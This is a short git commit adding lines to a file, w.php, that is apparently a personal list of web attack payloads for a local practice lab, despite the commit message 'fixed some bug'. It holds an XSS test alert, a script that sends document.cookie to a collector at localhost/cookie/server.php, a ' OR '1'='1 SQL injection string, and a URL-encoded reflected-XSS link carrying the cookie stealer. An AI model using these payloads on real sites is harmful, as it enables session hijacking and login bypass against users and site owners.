68304c2bb82f76e5aa3c3b1024e24a326ea8ff43
Naimul07 <naimul.cse.brur@gmail.com>
2023-11-07 11:57:08 +0600

    fixed some bug

--- w.php
+++ w.php
@@ -1,3 +1,5 @@
 <script>alert("hello");</script>
 http://localhost/cookie/server.php
+Naimul_07' OR '1'='1
 <script>location.href="http://localhost/cookie/server.php?cookie="+document.cookie</script>
+http://localhost/sql-injection-master/welcome.php?name=%3Cscript%3Elocation.href%3D%22http%3A%2F%2Flocalhost%2Fcookie%2Fserver.php%3Fcookie%3D%22%2Bdocument.cookie%3C%2Fscript%3E
